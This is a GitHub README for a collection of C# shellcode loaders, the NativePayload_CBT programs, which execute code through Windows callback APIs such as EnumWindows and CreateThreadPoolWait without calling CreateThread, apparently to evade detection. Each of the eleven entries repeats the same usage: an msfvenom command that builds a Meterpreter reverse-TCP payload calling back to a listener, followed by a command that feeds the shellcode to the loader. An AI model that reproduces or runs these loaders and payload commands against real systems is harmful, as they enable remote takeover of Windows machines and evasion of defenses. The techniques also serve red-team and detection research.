# NativePayload_CBT 
NativePayload_CallBackTechniques C# Codes (Code Execution via Callback Functions, without CreateThread Native API)
------------
Note: These C# Codes Tested by .Net Framework 3.5 or 4.0 only ;) & some of Codes are ready but i will Publish almost all of them from S4R1N C++ repo (soon)

Note: These Useful Techniques made by Security Researcher @S4R1N. 

Special Thanks to S4R1N for Original C++ Source:  https://github.com/S4R1N/AlternativeShellcodeExec
--------------------------------------------
C# Codes: "New C# codes for Callback Functions will publish here soon..."
   
    1. NativePayload_ImageGetDigestStream.cs
    2. NativePayload_EnumWindows.cs
    3. NativePayload_EnumWindowStationsW.cs
    4. NativePayload_EnumResourceTypesW.cs
    5. NativePayload_EnumChildWindows.cs
    6. NativePayload_EnumDisplayMonitors.cs
    7. NativePayload_EnumPageFilesW.cs
    8. NativePayload_EnumPropsExW.cs
    9. NativePayload_EnumerateLoadedModules.cs
    10. NativePayload_CreateThreadPoolWait.cs
    11. NativePayload_CreateTimerQueueTimer.cs

--------------------------------------------

1. NativePayload_ImageGetDigestStream.cs (Callback Functions Technique via ImageGetDigestStream Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_ImageGetDigestStream.exe  [payload...]
    example: NativePayload_ImageGetDigestStream.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_ImageGetDigestStream.png)

 -----------------------------------------------------------    
2. NativePayload_EnumWindows.cs (Callback Functions Technique via EnumWindows Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumWindows.exe  [payload...]
    example: NativePayload_EnumWindows.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumWindows.png)

 --------------------------------------------    
3. NativePayload_EnumWindowStationsW.cs (Callback Functions Technique via EnumWindowStationsW Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumWindowStationsW.exe  [payload...]
    example: NativePayload_EnumWindowStationsW.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumWindowStationW.png)
   
   --------------------------------------------    
4. NativePayload_EnumResourceTypesW.cs (Callback Functions Technique via EnumResourceTypesW Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumResourceTypesW.exe  [payload...]
    example: NativePayload_EnumResourceTypesW.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumResourceTypesW.png)

 --------------------------------------------    
5. NativePayload_EnumChildWindows.cs (Callback Functions Technique via EnumChildWindows Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumChildWindows.exe  [payload...]
    example: NativePayload_EnumChildWindows.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumChildWindows.png)

 --------------------------------------------    
6. NativePayload_EnumDisplayMonitors.cs (Callback Functions Technique via EnumDisplayMonitors Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumDisplayMonitors.exe  [payload...]
    example: NativePayload_EnumDisplayMonitors.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumDisplayMonitors.png)

 --------------------------------------------    
7. NativePayload_EnumPageFilesW.cs (Callback Functions Technique via EnumPageFilesW Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumPageFilesW.exe  [payload...]
    example: NativePayload_EnumPageFilesW.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumPageFilesW.png)

 --------------------------------------------   
8. NativePayload_EnumPropsExW.cs (Callback Functions Technique via EnumPropsExW Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumPropsExW.exe  [payload...]
    example: NativePayload_EnumPropsExW.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumPropsExW.png)

 --------------------------------------------   
 9. NativePayload_EnumerateLoadedModules.cs (Callback Functions Technique via EnumerateLoadedModules/W64 Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumerateLoadedModules.exe  [payload...]
    example: NativePayload_EnumerateLoadedModules.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumerateModulesLoaded_W64.png)

 --------------------------------------------   
  10. NativePayload_CreateThreadPoolWait.cs (Callback Functions Technique via CreateThreadPoolWait Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_CreateThreadPoolWait.exe  [payload...]
    example: NativePayload_CreateThreadPoolWait.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_CreateThreadPoolWait.png)

 --------------------------------------------   
  11. NativePayload_CreateTimerQueueTimer.cs (Callback Functions Technique via CreateTimerQueueTimer Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_CreateTimerQueueTimer.exe  [payload...]
    example: NativePayload_CreateTimerQueueTimer.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_CreateTimerQueueTimer.png)

 --------------------------------------------   
